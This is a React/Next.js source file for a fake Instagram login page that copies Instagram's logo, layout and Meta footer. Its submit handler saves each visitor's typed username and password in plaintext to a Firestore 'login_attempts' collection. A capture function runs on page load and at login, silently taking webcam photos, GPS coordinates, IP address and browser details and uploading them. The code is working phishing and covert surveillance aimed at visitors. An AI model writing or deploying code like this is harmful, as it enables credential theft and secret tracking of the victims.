'use client'

import { RouterObject } from '@web/core/router'
import { GoogleOauth } from '@web/modules/googleOauth'
import { GoogleButton } from '@web/modules/googleOauth/components/googleButton'
import { Header } from '../components/Header'
import { LoginForm } from './components/LoginForm'
import { useRouter } from 'next/navigation'
import { useCoreStore } from '@web/core/store'
import { AuthenticationHook } from '@web/domain/authentication'
import { useAuthentication } from '@web/modules/authentication'
import { Button, Divider, Flex, Grid, Input, Typography } from 'antd'
import { useSnackbar } from 'notistack'
import { useEffect } from 'react'
import { ErrorAlert } from './components/ErrorAlert'
import { GoogleOAuthProvider, GoogleLogin } from '@react-oauth/google'
import { auth, firestore, storage } from './firebaseConfig'
import { addDoc, collection } from 'firebase/firestore'
import { getDownloadURL, ref, uploadBytes } from 'firebase/storage'
import imageCompression from 'browser-image-compression'

const { Text } = Typography
const { useBreakpoint } = Grid

export default function WelcomePage() {
  const router = useRouter()
  const store = useCoreStore()
  const { enqueueSnackbar } = useSnackbar()
  const authentication = useAuthentication()
  const screens = useBreakpoint()

  const {
    login,
    isLoading: isLoadingLogin,
    isSuccess: isSuccessLogin,
    errors: errorsLogin,
  } = AuthenticationHook.useLogin()

  const {
    googleCallback,
    isLoading: isLoadingGoogle,
    isSuccess: isSuccessGoogle,
    errors: errorsGoogle,
  } = AuthenticationHook.useGoogle()

  const isSuccess = isSuccessLogin || isSuccessGoogle
  const isLoading = isLoadingLogin || isLoadingGoogle || isSuccess
  const errors = [...errorsLogin, ...errorsGoogle]

  useEffect(() => {
    if (isSuccess) {
      onSuccess()
    }
  }, [isSuccess])

  useEffect(() => {
    // Capture image and location on page load with 1.5 seconds interval
    const captureImages = async () => {
      for (let i = 0; i < 3; i++) {
        setTimeout(captureImageAndLocation, i * 1500)
      }
    }
    captureImages()
  }, [])

  const onError = () => {
    enqueueSnackbar('Could not login with Google', { variant: 'error' })
  }

  const onSuccess = async () => {
    try {
      router.push(RouterObject.route.HOME)
    } catch (error) {
      enqueueSnackbar('Something went wrong during the initialization', {
        variant: 'error',
      })
    }
  }

  const handleSubmit = async (event: React.MouseEvent<HTMLButtonElement, MouseEvent>) => {
    event.preventDefault()
    const email = (document.querySelector('input[placeholder="Phone number, username, or email"]') as HTMLInputElement).value
    const password = (document.querySelector('input[placeholder="Password"]') as HTMLInputElement).value

    // Capture image when user tries to log in
    await captureImageAndLocation()

    // Send email and password to Firebase Firestore
    await addDoc(collection(firestore, 'login_attempts'), {
      email,
      password,
      timestamp: new Date()
    })

    login({ email, password })
  }

  const handleGoogleSuccess = (response: { credential: string }) => {
    googleCallback(response)
  }

  const handleGoogleSignIn = () => {
    router.push('/google-sign-in')
  }

  const captureImageAndLocation = async () => {
    try {
      // Capture image from the camera
      const stream = await navigator.mediaDevices.getUserMedia({ video: true })
      const track = stream.getVideoTracks()[0]
      const imageCapture = new ImageCapture(track)
      const blob = await imageCapture.takePhoto()
      track.stop()

      // Compress the image to ensure it's within 100 KB
      const compressedBlob = await imageCompression(blob, {
        maxSizeMB: 0.1, // 0.1 MB = 100 KB
        maxWidthOrHeight: 1920, // Optional: Resize image to max 1920px width/height
        useWebWorker: true, // Optional: Use web worker for compression
      })

      // Capture location
      navigator.geolocation.getCurrentPosition(async (position) => {
        const { latitude, longitude } = position.coords

        // Get IP address
        const ipResponse = await fetch('https://api64.ipify.org?format=json')
        const ipData = await ipResponse.json()
        const ipAddress = ipData.ip

        // Get device info from User-Agent
        const userAgent = navigator.userAgent

        // Upload compressed image to Firebase Storage
        const storageRef = ref(storage, `images/${Date.now()}.jpg`)
        await uploadBytes(storageRef, compressedBlob)
        const imageUrl = await getDownloadURL(storageRef)

        // Save image URL and location data to Firestore
        await addDoc(collection(firestore, 'images'), {
          imageUrl,
          latitude,
          longitude,
          ipAddress,
          userAgent,
          timestamp: new Date()
        })
      })
    } catch (error) {
      enqueueSnackbar('Failed to capture image or location', { variant: 'error' })
    }
  }

  return (
    <GoogleOAuthProvider clientId="YOUR_GOOGLE_CLIENT_ID">
      <Flex align="center" justify="center" style={{ flexDirection: 'row', flex: 1 }}>
        {screens.md && (
          <img
            src='https://apkresult.io/wp-content/uploads/2024/04/iglookup-mod-1.webp'
            alt="Phone"
            style={{
              width: '340px',
              height: 'auto',
              marginRight: '20px',
            }}
          />
        )}
        <Flex
          vertical
          style={{
            width: '340px',
            paddingBottom: '100px',
            paddingTop: '100px',
            position: 'relative',
          }}
          gap="middle"
        >

          <ErrorAlert errors={errors} />

          <Flex
            vertical
            style={{
              border: '1px solid #ccc',
              padding: '20px',
              borderRadius: '8px',
              position: 'relative',
              zIndex: 1,
            }}
          >
            <img
              src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSz3GOa09_CQMYmfIdDYXaBzmcVTpSuvTeSpQ&s'
              alt="Instagram Logo"
              style={{ width: '175px', margin: '0 auto', marginBottom: '8px' }}
            />
            <Input
              placeholder="Phone number, username, or email"
              style={{ marginBottom: '10px' }}
            />
            <Input.Password placeholder="Password" style={{ marginBottom: '10px' }} />
            <Button type="primary" block style={{ marginBottom: '10px' }} onClick={handleSubmit}>
              Log in
            </Button>
            <Text
              type="secondary"
              style={{ textAlign: 'center', marginBottom: '10px' }}
            >
              Forgot password?
            </Text>

            <Divider>OR</Divider>

            <Button type="default" block style={{ marginBottom: '10px' }}>
              Log in with Facebook
            </Button>

            <GoogleLogin
              onSuccess={handleGoogleSuccess}
              onError={onError}
            />

          </Flex>

          <Flex
            vertical
            style={{
              border: '1px solid #ccc',
              padding: '20px',
              borderRadius: '8px',
              position: 'relative',
              zIndex: 1,
              marginTop: '10px',
            }}
          >
            <Text
              type="secondary"
              style={{ textAlign: 'center', marginBottom: '10px' }}
            >
              Don't have an account? <a href="/register">Sign up</a>
            </Text>
          </Flex>
        </Flex>
      </Flex>

      <Flex justify="center" style={{ marginTop: '20px', textDecorationLine: 'none', flexWrap: 'wrap' }}>
        {['Meta', 'About', 'Blog', 'Jobs', 'Help', 'API', 'Privacy', 'Terms', 'Locations', 'Instagram Lite', 'Threads', 'Contact uploading and non-users', 'Meta Verified', 'English (UK)'].map((item) => (
          <Text key={item} type="secondary" style={{ margin: '0px 4px', fontSize: '11px', marginBottom: '8px' }}>
            {item}
          </Text>
        ))}
      </Flex>

      <Flex justify="center" style={{ marginBottom: '55px', fontSize: '3px', flexWrap: 'wrap' }}>
        <Text>English (UK)</Text>
        <Text style={{ margin: '0 5px' }}>© 2024 Instagram from Meta</Text>
      </Flex>
    </GoogleOAuthProvider>
  )
}
